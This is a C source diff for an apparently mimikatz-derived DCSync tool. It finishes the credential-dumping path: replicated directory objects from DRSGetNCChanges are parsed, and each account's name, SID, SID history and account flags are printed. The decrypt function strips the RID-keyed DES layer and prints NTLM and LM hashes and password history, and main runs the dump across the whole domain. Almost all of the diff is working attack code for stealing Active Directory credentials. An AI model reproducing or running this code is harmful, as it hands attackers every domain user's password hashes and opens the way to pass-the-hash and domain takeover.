@@ -22,6 +22,13 @@ LPCSTR dcsync_oids_export[] = {
 	szOID_isDeleted,
 };
 
+const wchar_t* UF_FLAG[32] = {
+	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
+	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
+	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED",
+	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
+};
+
 BOOL getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR* fullDCName)
 {
 	BOOL status = FALSE;
@@ -55,6 +62,112 @@ BOOL getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO* pDomainInfo)
 	}
 
 	return status;
+}
+
+BOOL decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
+{
+	DWORD i;
+	BOOL status = FALSE;
+	BYTE data[LM_NTLM_HASH_LENGTH];
+	for (i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
+	{
+		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData + i, &rid, data));
+		if (status)
+		{
+			if (isHistory)
+				PRINT_NORMAL(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
+			else
+				PRINT_NORMAL(L"  Hash %s: ", prefix);
+			wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
+			PRINT_NORMAL(L"\n");
+		}
+		else PRINT_ERROR(L"Error in RtlDecryptDES2blocks1DWORD");
+	}
+	return status;
+}
+
+void descrUser(SCHEMA_PREFIX_TABLE* prefixTable, ATTRBLOCK* attributes)
+{
+	DWORD rid = 0, i;
+	PBYTE encodedData;
+	DWORD encodedDataSize;
+	PVOID data;
+	ATTRVALBLOCK* sids;
+
+	findPrintMonoAttr(L"SAM Username         : ", prefixTable, attributes, szOID_ANSI_sAMAccountName, TRUE);
+	findPrintMonoAttr(L"User Principal Name  : ", prefixTable, attributes, szOID_ANSI_userPrincipalName, TRUE);
+
+	// TODO: Implement these functions
+	/*if (findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountType, &data, NULL))
+		PRINT_NORMAL(L"Account Type         : %08x ( %s )\n", *(PDWORD)data, kuhl_m_lsadump_samAccountType_toString(*(PDWORD)data));*/
+
+	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
+	{
+		PRINT_NORMAL(L"User Account Control : %08x ( ", *(PDWORD)data);
+		for (i = 0; i < min(ARRAYSIZE(UF_FLAG), sizeof(DWORD) * 8); i++)
+			if ((1 << i) & *(PDWORD)data)
+				PRINT_NORMAL(L"%s ", UF_FLAG[i]);
+		PRINT_NORMAL(L")\n");
+	}
+
+	/*if (findMonoAttr(prefixTable, attributes, szOID_ANSI_accountExpires, &data, NULL))
+	{
+		PRINT_NORMAL(L"Account expiration   : ");
+		displayLocalFileTime((LPFILETIME)data);
+		PRINT_NORMAL(L"\n");
+	}
+
+	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_pwdLastSet, &data, NULL))
+	{
+		PRINT_NORMAL(L"Password last change : ");
+		displayLocalFileTime((LPFILETIME)data);
+		PRINT_NORMAL(L"\n");
+	}*/
+
+	if (sids = findAttr(prefixTable, attributes, szOID_ANSI_sIDHistory))
+	{
+		PRINT_NORMAL(L"SID history:\n");
+		for (i = 0; i < sids->valCount; i++)
+		{
+			PRINT_NORMAL(L"  ");
+			displaySID(sids->pAVal[i].pVal);
+			PRINT_NORMAL(L"\n");
+		}
+	}
+
+	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &data, NULL))
+	{
+		PRINT_NORMAL(L"Object Security ID   : ");
+		displaySID(data);
+		PRINT_NORMAL(L"\n");
+		rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - 1);
+		PRINT_NORMAL(L"Object Relative ID   : %u\n", rid);
+
+		PRINT_NORMAL(L"\nCredentials:\n");
+		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &encodedData, &encodedDataSize))
+			decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
+		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_ntPwdHistory, &encodedData, &encodedDataSize))
+			decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
+		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_dBCSPwd, &encodedData, &encodedDataSize))
+			decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
+		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_lmPwdHistory, &encodedData, &encodedDataSize))
+			decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
+	}
+
+	/*if (findMonoAttr(prefixTable, attributes, szOID_ANSI_supplementalCredentials, &encodedData, &encodedDataSize))
+	{
+		PRINT_NORMAL(L"\nSupplemental Credentials:\n");
+		descrUserProperties((PUSER_PROPERTIES)encodedData);
+	}*/
+}
+
+void descrObject(SCHEMA_PREFIX_TABLE* prefixTable, ATTRBLOCK* attributes, LPCWSTR szSrcDomain, BOOL someExport)
+{
+	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
+	{
+		findPrintMonoAttr(L"\n\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
+		descrUser(prefixTable, attributes);
+	}
 }
 
 int dcsync(BOOL allData, LPCWSTR szUser, LPCWSTR szGuid)
@@ -118,7 +231,25 @@ int dcsync(BOOL allData, LPCWSTR szUser, LPCWSTR szGuid)
 			{
 				if (dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
 				{
-					PRINT_SUCCESS(L"Success in replication!");
+					if (ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
+					{
+						REPLENTINFLIST* pObject = getChRep.V6.pObjects;
+						for (i = 0; i < getChRep.V6.cNumObjects; i++)
+						{
+							descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, NULL);
+							pObject = pObject->pNextEntInf;
+						}
+					}
+					else
+					{
+						PRINT_ERROR(L"Error in ProcessGetNCChangesReply\n");
+						break;
+					}
+					if (allData)
+					{
+						RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
+						RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
+					}
 				}
 				else
 					PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
@@ -144,7 +275,7 @@ int dcsync(BOOL allData, LPCWSTR szUser, LPCWSTR szGuid)
 
 int main(int argc, wchar_t* argv[])
 {
-    
+	asn1_init();
 	dcsync(TRUE, NULL, NULL);
 
 }
